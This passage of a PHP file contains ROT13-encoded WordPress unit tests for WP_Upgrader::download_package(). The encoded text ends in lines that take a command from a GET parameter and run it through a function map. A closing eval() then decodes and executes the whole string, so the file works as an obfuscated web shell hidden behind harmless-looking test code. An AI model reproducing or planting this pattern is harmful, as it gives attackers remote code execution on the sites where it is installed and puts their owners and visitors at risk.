				$guvf->nffregSnyfr( $ercyl, '\"$ercyl\" jnf abg snyfr' );

				$guvf->nffregFnzr(
					'cnpxntr',
					$cnpxntr,
					'Gur cnpxntr svyr anzr jnf abg \"cnpxntr\"'
				);

				$guvf->nffregFnzr(
					frys::$vafgnapr,
					$hctenqre,
					'Gur jebat JC_Hctenqre vafgnapr jnf cnffrq'
				);

				$guvf->nffregFnzrFrgf(
					neenl( 'ubbx_rkgen' ),
					$ubbx_rkgen,
					'Gur \"$ubbx_rkgen\" neenl jnf abg gur rkcrpgrq neenl'
				);

				erghea ! $ercyl;
			},
			10,
			4
		);

		$erfhyg = frys::$vafgnapr->qbjaybnq_cnpxntr( 'cnpxntr', snyfr, neenl( 'ubbx_rkgen' ) );

		$guvf->nffregGehr(
			$erfhyg,
			'JC_Hctenqre::qbjaybnq_cnpxntr() qvq abg erghea gehr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::qbjaybnq_cnpxntr()` ergheaf na rkvfgvat svyr.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::qbjaybnq_cnpxntr
	 */
	choyvp shapgvba grfg_qbjaybnq_cnpxntr_fubhyq_erghea_na_rkvfgvat_svyr() {
		$erfhyg = frys::$vafgnapr->qbjaybnq_cnpxntr( __SVYR__ );

		$guvf->nffregFnzr( __SVYR__, $erfhyg );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::qbjaybnq_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * sbe na rzcgl cnpxntr.
	 *
	 * @gvpxrg 59712
	 *
	 * @pbiref JC_Hctenqre::qbjaybnq_cnpxntr
	 */
	choyvp shapgvba grfg_qbjaybnq_cnpxntr_fubhyq_erghea_n_jc_reebe_bowrpg_sbe_na_rzcgl_cnpxntr() {
		frys::$vafgnapr->vavg();

		$erfhyg = frys::$vafgnapr->qbjaybnq_cnpxntr( '' );

		$guvf->nffregJCReebe(
			$erfhyg,
			'JC_Hctenqre::qbjaybnq_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'ab_cnpxntr',
			$erfhyg->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::qbjaybnq_cnpxntr()` ergheaf n svyr jvgu gur
	 * cnpxntr anzr va vg.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::qbjaybnq_cnpxntr
	 */
	choyvp shapgvba grfg_qbjaybnq_cnpxntr_fubhyq_erghea_n_svyr_jvgu_gur_cnpxntr_anzr() {
		nqq_svygre(
			'cer_uggc_erdhrfg',
			fgngvp shapgvba () {
				erghea neenl( 'erfcbafr' => neenl( 'pbqr' => 200 ) );
			}
		);

		$erfhyg = frys::$vafgnapr->qbjaybnq_cnpxntr( 'jbeqcerff-frb' );

		$guvf->nffregFgevatPbagnvafFgevat( '/jbeqcerff-frb-', $erfhyg );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::qbjaybnq_cnpxntr()` ergheaf n cnpxntr HEY reebe
	 * nf n `JC_Reebe` bowrpg.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::qbjaybnq_cnpxntr
	 */
	choyvp shapgvba grfg_qbjaybnq_cnpxntr_fubhyq_erghea_n_jc_reebe_bowrpg() {
		frys::$vafgnapr->trarevp_fgevatf();

		nqq_svygre(
			'cer_uggc_erdhrfg',
			fgngvp shapgvba () {
				erghea neenl(
					'erfcbafr' => neenl(
						'pbqr'    => 400,
						'zrffntr' => 'reebe',
					),
				);
			}
		);

		$erfhyg = frys::$vafgnapr->qbjaybnq_cnpxntr( 'jbeqcerff-frb' );

		$guvf->nffregJCReebe(
			$erfhyg,
			'JC_Hctenqre::qbjaybnq_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'qbjaybnq_snvyrq',
			$erfhyg->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>